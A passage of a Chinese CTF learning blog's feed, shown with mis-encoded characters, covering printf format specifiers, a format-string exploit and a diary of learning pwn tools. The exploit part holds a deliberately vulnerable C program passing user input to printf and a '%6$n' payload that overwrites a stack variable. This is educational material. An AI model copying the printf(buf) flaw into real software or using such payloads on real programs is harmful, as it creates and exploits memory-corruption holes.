align="left"><code>double</code>å‹æ•°å€¼ï¼Œç²¾åº¦å®šä¹‰ä¸ºå…¨éƒ¨æœ‰æ•ˆæ•°å­—ä½æ•°ã€‚å½“æŒ‡æ•°éƒ¨åˆ†åœ¨é—­åŒºé—´ [-4,ç²¾åº¦] å†…ï¼Œè¾“å‡ºä¸ºå®šç‚¹å½¢å¼ï¼›å¦åˆ™è¾“å‡ºä¸ºæŒ‡æ•°æµ®ç‚¹å½¢å¼ã€‚<code>g</code>ä½¿ç”¨å°å†™å­—æ¯ï¼Œ<code>G</code>ä½¿ç”¨å¤§å†™å­—æ¯ã€‚å°æ•°ç‚¹å³ä¾§çš„å°¾æ•°0ä¸è¢«æ˜¾ç¤ºï¼›æ˜¾ç¤ºå°æ•°ç‚¹ä»…å½“è¾“å‡ºçš„å°æ•°éƒ¨åˆ†ä¸ä¸º0ã€‚</td></tr><tr><td>x,X</td><td align="left">16è¿›åˆ¶<code>unsigned int</code>ã€‚<code>x</code>ä½¿ç”¨å°å†™å­—æ¯ï¼›<code>X</code>ä½¿ç”¨å¤§å†™å­—æ¯ã€‚å¦‚æœæŒ‡å®šäº†ç²¾åº¦ï¼Œåˆ™è¾“å‡ºçš„æ•°å­—ä¸è¶³æ—¶åœ¨å·¦ä¾§è¡¥0ã€‚é»˜è®¤ç²¾åº¦ä¸º1ã€‚ç²¾åº¦ä¸º0ä¸”å€¼ä¸º0ï¼Œåˆ™è¾“å‡ºä¸ºç©ºã€‚</td></tr><tr><td>o</td><td align="left">8è¿›åˆ¶<code>unsigned int</code>ã€‚å¦‚æœæŒ‡å®šäº†ç²¾åº¦ï¼Œåˆ™è¾“å‡ºçš„æ•°å­—ä¸è¶³æ—¶åœ¨å·¦ä¾§è¡¥0ã€‚é»˜è®¤ç²¾åº¦ä¸º1ã€‚ç²¾åº¦ä¸º0ä¸”å€¼ä¸º0ï¼Œåˆ™è¾“å‡ºä¸ºç©ºã€‚</td></tr><tr><td>s</td><td align="left">å¦‚æœæ²¡æœ‰ç”¨<code>l</code>æ ‡å¿—ï¼Œè¾“å‡º<code>null</code>ç»“å°¾å­—ç¬¦ä¸²ç›´åˆ°ç²¾åº¦è§„å®šçš„ä¸Šé™ï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šç²¾åº¦ï¼Œåˆ™è¾“å‡ºæ‰€æœ‰å­—èŠ‚ã€‚å¦‚æœç”¨äº†<code>l</code>æ ‡å¿—ï¼Œåˆ™å¯¹åº”å‡½æ•°å‚æ•°æŒ‡å‘<code>wchar_t</code>å‹çš„æ•°ç»„ï¼Œè¾“å‡ºæ—¶æŠŠæ¯ä¸ªå®½å­—ç¬¦è½¬åŒ–ä¸ºå¤šå­—èŠ‚å­—ç¬¦ï¼Œç›¸å½“äºè°ƒç”¨<code>wcrtomb</code> å‡½æ•°ã€‚</td></tr><tr><td>c</td><td align="left">å¦‚æœæ²¡æœ‰ç”¨<code>l</code>æ ‡å¿—ï¼ŒæŠŠ<code>int</code>å‚æ•°è½¬ä¸º<code>unsigned char</code>å‹è¾“å‡ºï¼›å¦‚æœç”¨äº†<code>l</code>æ ‡å¿—ï¼ŒæŠŠ<code>wint_t</code>å‚æ•°è½¬ä¸ºåŒ…å«ä¸¤ä¸ªå…ƒç´ çš„ <code>chart_t</code>æ•°ç»„ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ åŒ…å«è¦è¾“å‡ºçš„å­—ç¬¦ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸º<code>null</code>å®½å­—ç¬¦ã€‚</td></tr><tr><td>p</td><td align="left">void*å‹ï¼Œè¾“å‡ºå¯¹åº”å˜é‡çš„å€¼ã€‚ <code>printf(&quot;%p&quot;, a)</code>ç”¨åœ°å€çš„æ ¼å¼æ‰“å°å˜é‡açš„å€¼ï¼Œ printf(â€œ%pâ€, &amp;a) æ‰“å°å˜é‡aæ‰€åœ¨çš„åœ°å€ã€‚</td></tr><tr><td>a,A</td><td align="left">double<code>å‹çš„16è¿›åˆ¶è¡¨ç¤ºï¼Œ</code>[âˆ’]0xh.hhhh pÂ±d<code>ã€‚å…¶ä¸­æŒ‡æ•°éƒ¨åˆ†ä¸º10è¿›åˆ¶è¡¨ç¤ºçš„å½¢å¼ã€‚ä¾‹å¦‚ï¼š1025.010è¾“å‡ºä¸º0x1.004000p+10ã€‚</code>a<code>ä½¿ç”¨å°å†™å­—æ¯ï¼Œ</code>A`ä½¿ç”¨å¤§å†™å­—æ¯ã€‚</td></tr><tr><td>n</td><td align="left">ä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„<strong>æ•´å‹æŒ‡é’ˆå‚æ•°</strong>æ‰€æŒ‡çš„å˜é‡ã€‚</td></tr><tr><td>%</td><td align="left"><code>% </code>å­—é¢å€¼ï¼Œä¸æ¥å—ä»»ä½•é™¤äº†<code>å‚æ•°</code>ä»¥å¤–çš„éƒ¨åˆ†ã€‚</td></tr></tbody></table><ul><li>ï¼ˆå¯é€‰ï¼‰å‚æ•° </li></ul><table><thead><tr><th>å­—ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>n$</code></td><td><code>n</code>æ˜¯ç”¨è¿™ä¸ªæ ¼å¼è¯´æ˜ç¬¦æ˜¾ç¤ºç¬¬å‡ ä¸ªå‚æ•°ï¼›è¿™ä½¿å¾—å‚æ•°å¯ä»¥è¾“å‡ºå¤šæ¬¡ï¼Œä½¿ç”¨å¤šä¸ªæ ¼å¼è¯´æ˜ç¬¦ï¼Œä»¥ä¸åŒçš„é¡ºåºè¾“å‡ºã€‚å¦‚æœä»»æ„ä¸€ä¸ªå ä½ç¬¦ä½¿ç”¨äº†å‚æ•° ï¼Œåˆ™å…¶ä»–æ‰€æœ‰å ä½ç¬¦å¿…é¡»ä¹Ÿä½¿ç”¨å‚æ•° ã€‚ä¾‹ï¼š<code>printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17)</code> äº§ç”Ÿ<code>17 0x11; 16 0x10</code></td></tr></tbody></table><p>å‰©ä¸‹çš„ç•¥ï¼ˆæœ‰ç”¨å†å¡«ï¼‰ã€‚</p><h3 id="1-3-åœ¨pwnä¸­çš„åº”ç”¨"><a href="#1-3-åœ¨pwnä¸­çš„åº”ç”¨" class="headerlink" title="1.3 åœ¨pwnä¸­çš„åº”ç”¨"></a>1.3 åœ¨pwnä¸­çš„åº”ç”¨</h3><p>çœ‹ä¸Šå»å¥½åƒè¯´ï¼Œ<code>printf</code>è¿™ä¸ªç±»å‹çš„å‡½æ•°åªèƒ½è¾“å‡ºå•Šã€‚ç„¶è€Œå®é™…ä¸Šï¼Œä»–æœ‰ä¸€ä¸ªæœ‰è¶£çš„è½¬æ¢æŒ‡ç¤ºç¬¦ï¼Œé‚£å°±æ˜¯ï¼š</p><p><code>%n</code>ï¼šä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚</p><p>æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">//printfn.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>a = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1234567890%n\n&quot;</span>,&amp;a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc printfn.c -o printfn</span><br><span class="hljs-meta">$</span><span class="bash"> ./printfn</span> <br>a = 1<br>1234567890<br>a = 10<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>ä½ çœ‹ï¼Œä»…ç”¨æ ‡å‡†è¾“å‡ºè¯­å¥å°±æˆåŠŸæ”¹å†™äº†açš„å€¼ï¼</p><p>è¯´åˆ°è¿™é‡Œå·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹<strong>å‚æ•°</strong>çš„å€¼ï¼Œæ¥æ”¹å†™<strong>è¯¥å€¼æ‰€å¯¹åº”çš„åœ°å€çš„å€¼</strong>ï¼Œä½¿ç¨‹åºæ‰§è¡Œå‘ç”Ÿé”™è¯¯ã€‚</p><p>æ¯”å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">//pwnit.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">80</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">int</span> a = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">int</span> *p = &amp;a;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br><span class="hljs-built_in">printf</span>(buf);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%x\n&quot;</span>,a);<br><span class="hljs-keyword">if</span>(a == <span class="hljs-number">0x10</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you pwn me!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æˆ‘ä»¬ç¼–è¯‘è¿è¡Œä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc pwnit.c -m32 -o pwnit</span><br>pwnit.c: In function â€˜mainâ€™:<br>pwnit.c:8:9: warning: format not a string literal and no format arguments [-Wformat-security]<br>  printf(buf);<br>         ^<br><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span> <br>abcde<br>abcde<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>è¾“å…¥abcdeä¼¼ä¹æ ¹æœ¬æ²¡ç”¨å“¦ã€‚ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²çœ‹çœ‹ï¼Œ<code>int a = 5</code>è¿™ä¸ªå˜é‡å£°æ˜åœ¨å“ªï¼š</p><p>è¾“å…¥å­—ç¬¦ä¸²ï¼šaaaa-%p-%p-%p-%p-%p-%p-%p-%p</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaa-%</span><span class="bash">p-%p-%p-%p-%p-%p-%p-%p-%p</span><br>aaaa-0x804a060-0xf75bca60-0x80485db-0x1-0x5-0xfff84494-0x4f3eea00-0xf77413dc-0xfff844c0<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•çš„é‡ç‚¹åœ¨äºï¼š<strong>printfå‡½æ•°çš„å‚æ•°æ˜¯å…ˆè¢«å‹å…¥æ ˆä¸­åè·å–æ ˆä¸­çš„å€¼æˆ–è€…åœ°å€ä½œä¸ºå‚æ•°çš„ï¼</strong>å½“åˆæ²¡æœ‰æƒ³æ˜ç™½è¿™ä¸ªé—®é¢˜ï¼Œå›°æƒ‘äº†å¥½ä¹…ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å‘ç°ï¼Œç¬¬5ä¸ªå‚æ•°çš„å€¼æ˜¯0x5ï¼Œè¯´æ˜æˆ‘ä»¬åªè¦æŠŠç¬¬6ä¸ªå‚æ•°<code>ï¼ˆint* pï¼‰</code>æ”¹æˆ0x10å°±å¯ä»¥äº†ï¼</p><p>è¾“å…¥å­—ç¬¦ä¸²ï¼šaaaaaaaaaaaaaaaa%6$n</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaaaaaaaaaaaaaa%</span><span class="bash">6<span class="hljs-variable">$n</span></span><br>aaaaaaaaaaaaaaaa<br>10<br>you pwn me!<br><span class="hljs-meta">$</span><br></code></pre></div></td></tr></table></figure><p>æˆåŠŸï¼</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>Cè¯­è¨€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Daily</title>
    <link href="/2021-06/Now-Sky-Learning-Daily/"/>
    <url>/2021-06/Now-Sky-Learning-Daily/</url>
    
    <content type="html"><![CDATA[<h2 id="å±äºpwnçš„æ—¶é—´"><a href="#å±äºpwnçš„æ—¶é—´" class="headerlink" title="å±äºpwnçš„æ—¶é—´:"></a>å±äºpwnçš„æ—¶é—´:</h2><h3 id="ç¬¬0å‘¨-6-7-6-13"><a href="#ç¬¬0å‘¨-6-7-6-13" class="headerlink" title="ç¬¬0å‘¨:6/7-6/13"></a>ç¬¬0å‘¨:6/7-6/13</h3><ul><li>11: ä¸ºäº†idaæˆåŠŸæŠŠkali2020.3æ•´è«å¾—äº†, ä¸æƒ³å»ç ”ç©¶æ€ä¹ˆå¤åŸäº†, ç›´æ¥é‡è£…äº†ä¸ªkali2021.2, ä»¥åä¸€å®šå¼„<strong>å¿«ç…§</strong>.</li><li>12: å¼„æ˜ç™½äº†cachelabçš„é£Ÿç”¨æ–¹æ³•, ç›´æ¥ctrlcvä»£ç ç†è§£äº†ä¸‹, ä½†æ˜¯çœ‹èµ·æ¥è¿˜æ˜¯æœ‰å¾ˆå¤šå¯ä»¥æ”¹è¿›çš„åœ°æ–¹, æš‚æ—¶çœ‹ä¸è¿›å»äº†. <ul><li>typoraè£…çš„æ—¶å€™apt-keyå‡ºé—®é¢˜, å…¶å®è¿˜èƒ½ç”¨å‡ å¹´, æ›´modernçš„è§£å†³åŠæ³•<a href="https://suay.site/?p=526">åœ¨è¿™</a>(è¿˜æ²¡çœ‹).</li><li>é—®é¢˜åˆ—è¡¨è¿˜æ˜¯Markdowné è°±, æ€ç»´å¯¼å›¾çº¿å¤ªå¤šäº†, ç”¨ä¸ä¸Šç»“æ„çš„ä¼˜åŠ¿, é™¤äº†ç¬”è®°è¿˜æ˜¯ç”¨mdå§.</li></ul></li><li>13: ä»Šå¤©è®¡åˆ’çœ‹çœ‹é‚£å•¥buuojçš„é¢˜ç›®: æ²¡çœ‹æ‡‚ä»å“ªå¼€å§‹, è¿˜åœ¨wikiä¸­<ul><li>typora linuxç‰ˆå‘½ä»¤è¡Œå¯åŠ¨å¥½åƒæœ‰ç‚¹é—®é¢˜</li><li>å•¥ç©æ„å„¿å•Š, æ ¹æœ¬ä¸çŸ¥é“æ€ä¹ˆå¼€å§‹åšctfé¢˜ç›®-&gt;ææ‡‚äº†sshè¿æ¥åˆ°é¶æœº, ç»“æœåšåˆ°ç¬¬äºŒé¢˜å‘ç°æ˜¯web, è¯·æ±‚å­¦ä¸åˆ°å®¶å¹²è„†æ”¾å¼ƒäº†.</li><li>çœ‹äº†ç‚¹è®²åº§çš„å†…ç½‘ç©¿é€, æœ‰ä¸¶æ„æ€, å¯æƒœæˆ‘æ²¡æœ‰è¿™ç§éœ€æ±‚</li></ul></li></ul><h3 id="ç¬¬ä¸€å‘¨-6-14-6-20"><a href="#ç¬¬ä¸€å‘¨-6-14-6-20" class="headerlink" title="ç¬¬ä¸€å‘¨:6/14-6/20"></a>ç¬¬ä¸€å‘¨:6/14-6/20</h3><ul><li>å•¥ä¹Ÿæ²¡å¹², å¤ä¹ å‘¨</li></ul><h3 id="ç¬¬äºŒå‘¨-6-21-6-27"><a href="#ç¬¬äºŒå‘¨-6-21-6-27" class="headerlink" title="ç¬¬äºŒå‘¨:6/21-6/27"></a>ç¬¬äºŒå‘¨:6/21-6/27</h3><p>â€¦â€¦â€¦â€¦â€¦..</p><h3 id="ç¬¬ä¸€å‘¨-7-10-7-11"><a href="#ç¬¬ä¸€å‘¨-7-10-7-11" class="headerlink" title="ç¬¬ä¸€å‘¨:7/10-7/11"></a>ç¬¬ä¸€å‘¨:7/10-7/11</h3><ul><li><strong>10,11: ç›´æ¥ç›²é€‰äº†ä¸€æ‰‹ç³»ç»Ÿå®‰å…¨, è¦å¼€å§‹å­¦é€†å‘ä¹‹ç±»çš„ä¸œè¥¿äº†.</strong> <ul><li>çœ‹äº†çœ‹æ´›ç¥çš„æ”»é˜²ä¸–ç•Œçš„é¢˜è§£, çœ‹äº†ç¬¬ä¸€é“é¢˜æˆ‘å°±ä¸‹è½½äº†pwntools ida pedaè¿™ä¸‰ä¸ªå·¥å…·, ç”¨äº†ä¸‹checksecçœ‹çœ‹æ–‡ä»¶çš„ç±»å‹, å†è¯•äº†è¯•ncå‘½ä»¤è¿æ¥åˆ°æœåŠ¡å™¨, è¿è¡Œä¸€ä¸‹å°±å¾—åˆ°äº†flag</li><li>ç¬¬äºŒé¢˜æ˜¯å…³äºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„, çœ‹äº†è€åŠå¤©, æ´›ç¥ç›´æ¥å†™ä¸ªå¾ˆæ˜æ˜¾, çœŸä¸çŸ¥é“ä»–å†™è¿™ä¸ªçš„æ—¶å€™æ˜¯ä»€ä¹ˆæ°´å¹³, æˆ‘è¿˜å•¥éƒ½ä¸ä¼šå‘¢. å“¦å¯¹, æˆ‘çœ‹åˆ°ä¸€åŠä»–å±…ç„¶å†™äº†ä¸ªpython, è¿˜æ˜¯ç”¨çš„pwntoolsçš„æ¥å£, äººå‚»äº†, æ˜å¤©å…¥é—¨pythonå», ç„¶åå†çœ‹çœ‹pwntoolsçš„pythonå†™æ³•</li></ul></li></ul><h3 id="ç¬¬äºŒå‘¨-7-12-7-18"><a href="#ç¬¬äºŒå‘¨-7-12-7-18" class="headerlink" title="ç¬¬äºŒå‘¨:7/12-7/18"></a>ç¬¬äºŒå‘¨:7/12-7/18</h3><ul><li><p><strong>12:è¿™å‘¨ä¸åšCGäº†, å¼€å§‹ç ”ç©¶CTF</strong>.</p><ul><li>ä»Šå¤©å…ˆå…¥é—¨ä¸ªpythonå…ˆ.</li></ul></li><li><p><strong>13: ä»Šå¤©æ‰“ç®—å­¦ä¹ pwntoolsçš„ç”¨æ³•</strong>.</p><ul><li>pythonçœ‹åˆ°äº†package,  çœ‹è¿‡äº†import, å„ç§åŸºæœ¬ç±»å‹çš„ç”¨æ³•, ç±»è¿˜æ²¡çœ‹.</li><li><a href="https://pwntools.readthedocs.io/en/latest/tubes/sockets.html#module-pwnlib.tubes.remote">pwnlib.tubes</a>, è¿™é‡Œæœ‰å¾ˆå¤šä¸œè¥¿, å¯ä»¥ç›´æ¥ç½‘é¡µæ‰“å¼€ç„¶åå»æœå‡½æ•°, unpack()å’Œpack()çš„ä½œç”¨æ˜¯å°†æ•°å­—æ‰“åŒ…æˆå¯è¾“å…¥çš„å­—ç¬¦ä¸²</li><li>vscodeè£…pythonè¿˜æ˜¯æŒºç®€å•çš„</li><li><code>%&lt; number&gt;$x</code> æ˜¯ç›´æ¥å­˜æ”¾åˆ°ç¬¬numberä¸ªä½ç½®çš„å‚æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨åœ¨%nï¼Œ%dç­‰ç­‰ã€‚<br>ä½†æ˜¯éœ€è¦æ³¨æ„64ä½ç¨‹åºï¼Œå‰6ä¸ªå‚æ•°æ˜¯å­˜åœ¨å¯„å­˜å™¨ä¸­çš„ï¼Œä»ç¬¬7ä¸ªå‚æ•°å¼€å§‹æ‰ä¼šå‡ºç°åœ¨æ ˆä¸­ï¼Œæ‰€ä»¥æ ˆä¸­ä»æ ¼å¼åŒ–ä¸²å¼€å§‹çš„ç¬¬ä¸€ä¸ªï¼Œåº”è¯¥æ˜¯%7 $n.<ul><li>åœ¨%10næ˜¯å•¥ä»¥åŠä¸ºå•¥è¦åŠ â€˜AAAAâ€™è¿™äº›é—®é¢˜ä¸Šå¡äº†åŠå¤©. <a href="https://bbs.pediy.com/thread-253638.htm">[0]</a>.</li><li><strong>é™¤äº†%n,è¿˜æœ‰%hnï¼Œ%hhnï¼Œ%llnï¼Œåˆ†åˆ«ä¸ºå†™å…¥ç›®æ ‡ç©ºé—´2å­—èŠ‚ï¼Œ1å­—èŠ‚ï¼Œ8å­—èŠ‚ã€‚</strong> æ³¨æ„æ˜¯<strong>å¯¹åº”å‚æ•°ï¼ˆè¿™ä¸ªå‚æ•°æ˜¯æŒ‡é’ˆï¼‰</strong>çš„å¯¹åº”çš„åœ°å€å¼€å§‹èµ·å‡ ä¸ªå­—èŠ‚ã€‚<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">[0]</a>.</li></ul></li></ul></li><li><p><strong>14: IDAä¸œè¥¿å¥½å¤š, ä¹Ÿçœ‹äº†çœ‹pwntoolsçš„æ–‡æ¡£, ç‰¹ä¹ˆä¹Ÿå¤ªå¤šäº†</strong>.(level2æ•´å®Œäº†, æ˜å¤©çœ‹çœ‹æ–‡æ¡£å‘Šåˆ«ç¡¬ç¼–ç !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!(å…ˆä¼šçœ‹å†è¯´))</p><ul><li><code>var_4 = dword ptr -4ï¼›</code>  è¿™æ˜¯è§£é‡Šä»£ç ï¼Œå¯è§£é‡Šæˆvar_4 æ˜¯ esp - 4å¤„çš„ç©ºé—´;<br><code>var_0 = dword ptr 8;</code>      var_0 æ˜¯ esp +8å¤„çš„ç©ºé—´ï¼›<img src="https://i.loli.net/2021/07/19/LtySjIVDrhfwlk7.png"></li></ul></li><li><p><code>/bin/bash</code>æ˜¯ä¸ªå¥½ä¸œè¥¿, å¦‚æœèƒ½è°ƒç”¨è¿™ä¸ªå¯ä»¥ç›´æ¥è·³è½¬åˆ°å‘½ä»¤è¡Œæ¨¡å¼, <code>interactive()</code>æ‰“å¼€åå°±èƒ½å‘å‘½ä»¤äº†</p><p><img src="https://i.loli.net/2021/07/19/TrCMBZjQpANFYhK.png"></p></li><li><p>å°†æ‚¬æµ®çª—å£å¤ä½: reset the desktop (mdå˜æˆæ‚¬æµ®çª—å£å°±å˜ä¸å›å»äº†??????????)</p><ul><li>èŠœæ¹–, <strong>savedesktop</strong>è¿˜æŒºå¥½ç”¨, è®¾ç½®äº†ä¸€ä¸ªæˆ‘ç°åœ¨æ°´å¹³å¤Ÿç”¨çš„default</li></ul></li><li><p>shift+F12: <u>strings window</u>.(è¿˜æœ‰f6,shift+f6,alt+f3)</p></li><li><p>æ±‡ç¼–è¯­è¨€<a href="https://blog.csdn.net/weixin_43229030/article/details/106799580#15_comment_field_166">ä¼ªæŒ‡ä»¤</a>.   a db 17 dup(?)çš„<a href="https://zhidao.baidu.com/question/2198876873686806628.html">å«ä¹‰</a>.</p></li><li><p>å¥‡æ€ªçš„ä¿¡æ¯: </p><img src="https://i.loli.net/2021/07/19/pYrMl7BxPmhfzUs.png" style="zoom: 50%;" /></li><li><p>python: next()å‡½æ•°å’Œsearch()çš„è¿”å›æ˜¯ä¸€ä¸ªå¯è¿­ä»£çš„ç±»å‹</p></li><li><p><em><strong><u>åœ¨32ä½ç¨‹åºè¿è¡Œä¸­ï¼Œå‡½æ•°å‚æ•°ç›´æ¥å‹å…¥æ ˆä¸­</u></strong></em>,(è¿˜èƒ½è¿™æ ·???????????????????????????????????)</p><p>(64ä½æ±‡ç¼–ä¼ å‚ï¼Œå½“å‚æ•°å°‘äº7ä¸ªæ—¶ï¼Œ å‚æ•°<strong>ä»å·¦åˆ°å³</strong>æ”¾å…¥å¯„å­˜å™¨: rdi, rsi, rdx, rcx, r8, r9ã€‚ å½“å‚æ•°ä¸º7ä¸ªä»¥ä¸Šæ—¶ï¼Œ<br>å‰ 6 ä¸ªä¸å‰é¢ä¸€æ ·ï¼Œ ä½†åé¢çš„ä¾æ¬¡**â€ä»å³å‘å·¦â€**æ”¾å…¥æ ˆä¸­ï¼Œå³å’Œ32ä½æ±‡ç¼–ä¸€æ ·ã€‚)</p><p>è°ƒç”¨å‡½æ•°æ—¶æ ˆçš„ç»“æ„ä¸º:è°ƒç”¨å‡½æ•°åœ°å€-&gt;å‡½æ•°çš„è¿”å›åœ°å€-&gt;å‚æ•°n-&gt;å‚æ•°n-1-&gt;â€¦-&gt;å‚æ•°1</p></li><li><p><strong>15: ä¸Šåˆè¿˜æ˜¯IDAçš„ä½¿ç”¨, ä¸‹åˆå†çœ‹æ–‡æ¡£. ä¸‹åˆä¹Ÿæ²¡çœ‹,</strong> .</p><ul><li>return __readfsqword(0x28u) ^ v4; è¿™ä¸ªæ˜¯é‡‘ä¸é›€å€¼canaryçš„æ£€æµ‹</li><li><u><em>é‡å¯å¤§æ³•å¥½</em></u>.(å¥½ä¸ªå±, è¿˜æ˜¯æ²¡è§£å†³)</li><li>åƒä¸‡åˆ«æŠŠæ–‡ä»¶åç§°å‘½åä¸ºæ¨¡å—åç§°, ä¸ç„¶ä¼šå‡ºé”™.</li><li>sendlineafterçš„ <strong>â€œ\nâ€</strong>ä¸€å®šè¦çœ‹æ¸…æ¥šäº†å†åŠ </li><li>å‡½æ•°æ ˆå¸§çš„æ„å»ºè¿‡ç¨‹, <strong>ä¼šæŠŠebpæ¨åˆ°æ ˆä¸Š</strong>.</li><li>çœ‹çœ‹Jumpèœå•é‡Œçš„å¿«æ·é”®!</li><li>åˆšè¿›å…¥å‡½æ•°æ—¶, æ ˆé¡¶æ˜¯è¿”å›åœ°å€!</li></ul></li><li><p><strong>16: ä»Šå¤©ä¸çŸ¥é“èƒ½åšå¤šå°‘, æ—©ä¸Šå§‘ä¸”æ•´å®Œäº†adworldçš„writeup, ä¸‹åˆæ™šä¸Šçœ‹æƒ…å†µ, å¼€å§‹buuoj</strong>, </p><ul><li><p>çœ‹äº†å‰©ä¸‹çš„tutorial, ä¸€äº›çœ‹ä¸æ‡‚, æœ‰ç”¨åˆ°å†è¯´å§</p></li><li><p>RWXæƒé™: rä»£è¡¨è¯»æƒé™ï¼Œwä»£è¡¨å†™æƒé™ï¼Œxä»£è¡¨æ‰§è¡Œæƒé™</p><p>ç›¸å…³çš„<a href="https://www.runoob.com/linux/linux-comm-chmod.html">chmodå‘½ä»¤</a> </p></li><li><p><a href="https://blog.csdn.net/weixin_43655282/article/details/105334313">retn</a>ä¸<em>å †æ ˆå¹³è¡¡æˆ–å†…å­˜å¯¹é½</em>   (é€‚ç”¨äº<strong>Ubuntu18</strong>åŠä»¥ä¸Šçš„ç‰ˆæœ¬).</p></li></ul></li><li><p><strong>17: ä»Šå¤©åœ¨åŠ¨è½¦ä¸Šå§‘ä¸”åšåˆ°äº†ç¬¬ä¸ƒé¢˜, å¹¶ä¸”ä¸‹è½½å¥½äº†LibcSearcheråº“, æ˜å¤©å¼€å§‹æ‹¿ä¸‹ç¬¬ä¸ƒé¢˜</strong> 